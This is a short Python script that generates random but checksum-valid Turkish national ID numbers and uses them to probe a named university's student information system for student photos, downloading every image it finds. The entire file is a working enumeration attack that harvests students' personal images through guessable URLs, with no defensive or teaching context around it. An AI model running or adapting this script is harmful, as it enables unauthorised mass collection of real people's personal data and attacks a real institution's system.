from random import randint
import urllib,requests
for i in range(0,1000):
    def rastgele_tc():
        tcno = str(randint(100000000, 1000000000))
        list_tc = map(int, tcno)
        tc10 = (sum(list_tc[::2]) * 7 - sum(list_tc[1::2])) % 10
        return tcno + str(tc10) + str((sum(list_tc[:9]) + tc10) % 10)
    a= rastgele_tc()

    link='https://obs.ybu.edu.tr/oibs/fotograf/ogrenci/'+str(a)+'.jpg'
    bad_r=requests.get('https://obs.ybu.edu.tr/oibs/fotograf/ogrenci/'+str(a)+'.jpg')
    hata=bad_r.status_code
    if hata==404:
       print(str(a)+' hata var')
    else:
       print('200')
       f = open(str(a)+'.jpg','wb')
       f.write(urllib.urlopen(link).read())
       f.close()

